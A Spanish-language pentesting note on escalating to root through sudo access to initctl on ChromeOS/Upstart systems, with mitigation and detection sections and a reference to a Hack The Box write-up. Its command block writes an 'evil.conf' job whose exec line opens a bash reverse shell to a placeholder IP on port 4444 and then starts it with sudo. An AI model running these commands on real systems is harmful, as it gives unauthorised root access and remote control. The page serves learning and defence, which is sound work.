---
topic: initctl — trabajos privilegiados en ChromeOS
tags: [linux, initctl, chromeos, sudo, privesc]
---

# initctl — trabajos privilegiados en ChromeOS

[🌐 English](initctl-privesc.en.md) | **Español**

## Concepto

En ChromeOS y sistemas basados en Upstart, `initctl` controla trabajos del sistema. Si un usuario puede ejecutarlo con sudo, puede iniciar, detener o recargar un trabajo cuya definición sea escribible, o lanzar un trabajo que ejecute un comando controlado. El resultado es ejecución como root aunque el binario no sea SUID.

## Cuándo aplica

- `sudo -l` muestra `initctl` sin restricciones.
- Existe un trabajo con configuración escribible o una ruta controlable.
- El sistema usa Upstart en lugar de systemd.

## Procedimiento

1. Revisar `sudo -l` y los trabajos disponibles.
2. Localizar un trabajo con comando o configuración controlable.
3. Modificar el comando o crear un trabajo nuevo.
4. Iniciar el trabajo y verificar la ejecución como root.

## Comandos

```bash
sudo -l
initctl list
ls -la /etc/init/
# Crear o modificar un trabajo
printf 'exec /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' | sudo tee /etc/init/evil.conf
sudo initctl start evil
```

## Variantes

- Usar `initctl reload-configuration` tras añadir un archivo.
- Modificar un trabajo existente con permisos débiles.
- Aprovechar un script invocado por un trabajo.

## Limitaciones

- La regla sudo puede limitar los trabajos permitidos.
- El directorio de trabajos puede ser de solo lectura.
- ChromeOS puede tener verificaciones de integridad.

## Mitigación

- Restringir `initctl` en sudoers.
- Proteger `/etc/init` y los scripts de trabajos.
- Auditar reglas sudo y trabajos del sistema.

## Detección

- Nuevos trabajos en `/etc/init`.
- `initctl start` desde cuentas no administrativas.
- Procesos hijos de Upstart con comandos inusuales.

## Referencias

- [0xdf — Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html)
- [Chromium OS — Upstart](https://chromium.googlesource.com/chromiumos/third_party/upstart/)
- [CWE-269 — Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
